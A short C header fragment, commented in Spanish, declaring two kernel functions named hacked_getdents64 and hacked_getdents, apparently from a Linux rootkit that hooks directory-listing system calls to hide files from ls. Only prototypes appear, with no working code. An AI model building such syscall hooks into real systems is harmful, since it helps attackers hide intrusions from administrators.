/* funciones de ls.c */

asmlinkage long hacked_getdents64
     (unsigned int fd, struct dirent64 *dirp, unsigned int count);
asmlinkage long hacked_getdents
	(unsigned int fd, struct dirent *dirp, unsigned int count);

